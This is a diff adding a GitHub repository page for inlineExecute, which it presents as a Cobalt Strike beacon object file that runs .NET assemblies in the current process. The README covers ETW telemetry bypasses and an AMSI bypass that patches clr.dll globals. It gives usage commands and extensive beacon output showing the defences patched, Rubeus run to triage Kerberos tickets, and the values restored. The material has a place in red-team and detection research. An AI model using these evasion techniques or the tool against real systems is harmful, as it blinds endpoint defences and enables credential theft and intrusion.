@@ -1,0 +1,297 @@
+# https://github.com/loland/inlineExecute
+
+[Skip to content](https://github.com/loland/inlineExecute#start-of-content)
+
+You signed in with another tab or window. [Reload](https://github.com/loland/inlineExecute) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/loland/inlineExecute) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/loland/inlineExecute) to refresh your session.Dismiss alert
+
+{{ message }}
+
+[loland](https://github.com/loland)/ **[inlineExecute](https://github.com/loland/inlineExecute)** Public
+
+- [Notifications](https://github.com/login?return_to=%2Floland%2FinlineExecute) You must be signed in to change notification settings
+- [Fork\\
+13](https://github.com/login?return_to=%2Floland%2FinlineExecute)
+- [Star\\
+58](https://github.com/login?return_to=%2Floland%2FinlineExecute)
+
+
+main
+
+[**1** Branch](https://github.com/loland/inlineExecute/branches) [**0** Tags](https://github.com/loland/inlineExecute/tags)
+
+[Go to Branches page](https://github.com/loland/inlineExecute/branches)[Go to Tags page](https://github.com/loland/inlineExecute/tags)
+
+Go to file
+
+Code
+
+Open more actions menu
+
+## Folders and files
+
+| Name | Name | Last commit message | Last commit date |
+| --- | --- | --- | --- |
+| ## Latest commit<br>[![loland](https://avatars.githubusercontent.com/u/73586395?v=4&size=40)](https://github.com/loland)[loland](https://github.com/loland/inlineExecute/commits?author=loland)<br>[-scan flag fixes](https://github.com/loland/inlineExecute/commit/e646802bbd573ce5ec93e4119ed5ba1a32756181)<br>Open commit details<br>6 months agoDec 10, 2025<br>[e646802](https://github.com/loland/inlineExecute/commit/e646802bbd573ce5ec93e4119ed5ba1a32756181) · 6 months agoDec 10, 2025<br>## History<br>[12 Commits](https://github.com/loland/inlineExecute/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/loland/inlineExecute/commits/main/) 12 Commits |
+| [Code Snippets](https://github.com/loland/inlineExecute/tree/main/Code%20Snippets "Code Snippets") | [Code Snippets](https://github.com/loland/inlineExecute/tree/main/Code%20Snippets "Code Snippets") | [Subscriber Bit Patching signature update](https://github.com/loland/inlineExecute/commit/1780e0ac41da77bae25d700964a38c3f052de69a "Subscriber Bit Patching signature update  Updated the signature to be compatible with older versions of clr.dll. Integrated into the BOF") | 6 months agoDec 4, 2025 |
+| [inlineExecute](https://github.com/loland/inlineExecute/tree/main/inlineExecute "inlineExecute") | [inlineExecute](https://github.com/loland/inlineExecute/tree/main/inlineExecute "inlineExecute") | [-scan flag fixes](https://github.com/loland/inlineExecute/commit/e646802bbd573ce5ec93e4119ed5ba1a32756181 "-scan flag fixes  LoadLibraryA(\"clr.dll\") does not work. Load clr.dll via startCLR() instead") | 6 months agoDec 10, 2025 |
+| [src](https://github.com/loland/inlineExecute/tree/main/src "src") | [src](https://github.com/loland/inlineExecute/tree/main/src "src") | [-scan flag fixes](https://github.com/loland/inlineExecute/commit/e646802bbd573ce5ec93e4119ed5ba1a32756181 "-scan flag fixes  LoadLibraryA(\"clr.dll\") does not work. Load clr.dll via startCLR() instead") | 6 months agoDec 10, 2025 |
+| [.gitattributes](https://github.com/loland/inlineExecute/blob/main/.gitattributes ".gitattributes") | [.gitattributes](https://github.com/loland/inlineExecute/blob/main/.gitattributes ".gitattributes") | [Initial commit](https://github.com/loland/inlineExecute/commit/c42c6d4202000ad763c66620fe70634fa1da3e48 "Initial commit") | 7 months agoNov 29, 2025 |
+| [README.md](https://github.com/loland/inlineExecute/blob/main/README.md "README.md") | [README.md](https://github.com/loland/inlineExecute/blob/main/README.md "README.md") | [AMSI patching](https://github.com/loland/inlineExecute/commit/400f763a0b4ab08ef61d50e45f2e2e7e35e84f9d "AMSI patching  Novel technique that patches the g_amsiContext and AmsiScanBuffer global variables. It is not extensively tested. Use with care.") | 6 months agoDec 9, 2025 |
+| View all files |
+
+## Repository files navigation
+
+# inlineExecute
+
+[Permalink: inlineExecute](https://github.com/loland/inlineExecute#inlineexecute)
+
+inlineExecute is a Cobalt Strike BOF that executes a .NET assembly in the current process (rather than spawning a sacrificial process with `execute-assembly`).
+
+It stands as a POC, and as a boilerplate to experiment with novel techniques in the future.
+
+## ETW Bypass
+
+[Permalink: ETW Bypass](https://github.com/loland/inlineExecute#etw-bypass)
+
+Currently, it implements the ETW bypass techniques: Provider Handle Patching and Subscriber Bit Patching. They are documented in my blog - [A Stealthier Reflective Loading](https://loland.cv/posts/2025-11-27-stealthier-reflective-loading/).
+
+These techniques prevent ETW telemetry from being generated by userland hooks in `clr.dll`.
+
+Unlike traditional ETW patching techniques. This does not modify memory protections, and does not require suspicious WinAPIs like `WriteProcessMemory`, `NTWriteVirtualMemory`, `VirtualProtect`, `NtProtectVirtualMemory`.
+
+## AMSI Bypass
+
+[Permalink: AMSI Bypass](https://github.com/loland/inlineExecute#amsi-bypass)
+
+The BOF also implements an AMSI patch for `clr.dll`, that doesn't modify memory protections nor use suspicious WinAPIs. It works by modifying the `g_amsiContext` and `AmsiScanBuffer` global variables, which reside in R/W memory.
+
+## Usage
+
+[Permalink: Usage](https://github.com/loland/inlineExecute#usage)
+
+Load `inlineExecute.cna` from `Cobalt Strike -> Script Manager -> Load`. Ensure that `inlineExecute.o` and `inlineExecute.cna` are in the same directory.
+
+```
+beacon> inlineExecute
+[+] Usage: inlineExecute [-etwH] [-etwB] [-verbose] [-amsi] [-scan] <filepath> <args>
+```
+
+The `-etwH` and `-etwB` flags patches ETW via the Provider Handle Patching and Subscriber Bit Patching technique respectively. They can be used together or individually.
+
+```
+inlineExecute -etwH -etwB /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
+```
+
+The `-verbose` flag outputs debugging information.
+
+```
+inlineExecute -verbose -etwB /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
+```
+
+The `-scan` flag displays the identified patchable values. These values are obtained from signatures in the x64 assembly. In an actual assessment, check that the values are correct as patching incorrect addresses may result in unexpected behaviour.
+
+```
+[12/09 22:45:47] beacon> inlineExecute -scan
+[12/09 22:45:48] [+] host called home, sent: 20366 bytes
+[12/09 22:45:48] [+] received output:
+[+] clr.dll loaded: 00007FFBE67D0000
+
+[12/09 22:45:48] [+] received output:
+[+] clr.dll path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+
+[12/09 22:45:48] [+] received output:
+[+] clr.dll build: 4.8.4515.0
+
+[12/09 22:45:48] [+] received output:
+[+] DotNETRuntimeHandle address: 00007FFBE72747F0
+
+[12/09 22:45:48] [+] received output:
+[+] DotNETRuntimeEnableBits address: 00007FFBE7262140
+
+[12/09 22:45:48] [+] received output:
+[+] AmsiScanBufferGlobal address: 00007FFBE727EE88
+
+[12/09 22:45:48] [+] received output:
+[+] amsiContext address: 00007FFBE727EE80
+```
+
+Example usage with `Rubeus.exe triage`.
+
+```
+[12/09 22:57:29] beacon> inlineExecute -etwB -etwH -amsi -verbose /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
+[12/09 22:57:29] [+] Executing: /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe
+[12/09 22:57:29] [+] Arguments: triage
+[12/09 22:57:31] [+] host called home, sent: 467348 bytes
+[12/09 22:57:31] [+] received output:
+[+] Runtime info obtained
+
+[12/09 22:57:31] [+] received output:
+[+] Runtime is loadable
+
+[12/09 22:57:31] [+] received output:
+[+] ICorRuntimeHost obtained
+
+[12/09 22:57:31] [+] received output:
+[+] CLR started successfully
+
+[12/09 22:57:31] [+] received output:
+[+] clr.dll path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+
+[12/09 22:57:31] [+] received output:
+[+] clr.dll build: 4.8.4515.0
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeHandle address: 00007FFBE72747F0
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeHandle value: 7e0cc620
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeHandle patched: 1
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeEnableBits address: 00007FFBE7262140
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeEnableBits value: 0
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeEnableBits patched: 0
+
+[12/09 22:57:31] [+] received output:
+[+] Found "lea rdx, aAmsiScanBuffer" at 00007FFBE6DE1039
+
+[12/09 22:57:31] [+] received output:
+[+] Found "call cs:__imp_GetProcAddress" at 00007FFBE6DE1043
+
+[12/09 22:57:31] [+] received output:
+[+] Suspected "mov  cs:?AmsiScanBuffer, <r64>" at 00007FFBE6DE1049
+
+[12/09 22:57:31] [+] received output:
+[+] Suspected "mov <r64>, cs:?g_amsiContext" at 00007FFBE6DE1050
+
+[12/09 22:57:31] [+] received output:
+[+] AmsiScanBufferGlobal address: 00007FFBE727EE88
+
+[12/09 22:57:31] [+] received output:
+[+] AmsiScanBufferGlobal value: 0000000000000001
+
+[12/09 22:57:31] [+] received output:
+[+] AmsiScanBufferGlobal patched: 00000299000D1990 (fakeAmsiScanBuffer)
+
+[12/09 22:57:31] [+] received output:
+[+] amsiContext address: 00007FFBE727EE80
+
+[12/09 22:57:31] [+] received output:
+[+] amsiContext value: 0000000000000000
+
+[12/09 22:57:31] [+] received output:
+[+] amsiContext patched: 0000000000000001
+
+[12/09 22:57:31] [+] received output:
+[+] Anonymous pipe created
+
+[12/09 22:57:31] [+] received output:
+[+] Console created and hidden
+
+[12/09 22:57:31] [+] received output:
+[+] Redirected stdout/stderr to pipe
+
+[12/09 22:57:31] [+] received output:
+[+] AppDomain Created
+
+[12/09 22:57:31] [+] received output:
+[+] fakeAmsiScanBuffer called
+
+[12/09 22:57:31] [+] received output:
+[+] Assembly Loaded
+
+[12/09 22:57:31] [+] received output:
+[+] Assembly executed, reading output...
+
+[12/09 22:57:31] [+] received output:
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+Action: Triage Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x44400
+
+ ---------------------------------------
+ | LUID | UserName | Service | EndTime |
+ ---------------------------------------
+ ---------------------------------------
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeHandle value restored: 7e0cc620
+
+[12/09 22:57:31] [+] received output:
+[+] DotNETRuntimeEnableBits value restored: 0
+
+[12/09 22:57:31] [+] received output:
+[+] AmsiScanBufferGlobal value restored: 0000000000000001
+
+[12/09 22:57:31] [+] received output:
+[+] amsiContext value restored: 0000000000000000
+
+[12/09 22:57:31] [+] received output:
+[+] Done
+```
+
+## About
+
+Cobalt Strike BOF
+
+
+### Resources
+
+[Readme](https://github.com/loland/inlineExecute#readme-ov-file)
+
+### Uh oh!
+
+There was an error while loading. [Please reload this page](https://github.com/loland/inlineExecute).
+
+[Activity](https://github.com/loland/inlineExecute/activity)
+
+### Stars
+
+[**58**\\
+stars](https://github.com/loland/inlineExecute/stargazers)
+
+### Watchers
+
+[**0**\\
+watching](https://github.com/loland/inlineExecute/watchers)
+
+### Forks
+
+[**13**\\
+forks](https://github.com/loland/inlineExecute/forks)
+
+[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Floland%2FinlineExecute&report=loland+%28user%29)
+
+## [Releases](https://github.com/loland/inlineExecute/releases)
+
+No releases published
+
+## [Packages\  0](https://github.com/users/loland/packages?repo_name=inlineExecute)
+
+No packages published
+
+## [Contributors\  1](https://github.com/loland/inlineExecute/graphs/contributors)
+
+- [![@loland](https://avatars.githubusercontent.com/u/73586395?s=64&v=4)](https://github.com/loland)[**loland**](https://github.com/loland)
+
+## Languages
+
+- [C93.3%](https://github.com/loland/inlineExecute/search?l=c)
+- [C#6.7%](https://github.com/loland/inlineExecute/search?l=c%23)
+
+You can’t perform that action at this time.
